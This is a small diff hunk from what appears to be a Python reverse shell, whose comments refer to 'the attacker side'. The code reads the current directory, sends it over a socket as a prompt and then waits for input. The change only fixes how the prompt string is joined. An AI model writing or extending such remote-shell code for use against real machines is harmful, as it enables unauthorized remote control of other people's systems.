@@ -12,7 +12,7 @@ while True:
     
     # _Getting the current directory as the input on the attacker side
     location = os.popen('cd').read()
-    result2 = " ".join(location) + ">>> "
+    result2 = "".join(location) + ">>> "
     client.sendall(result2.encode())
     
     # _receiving the input
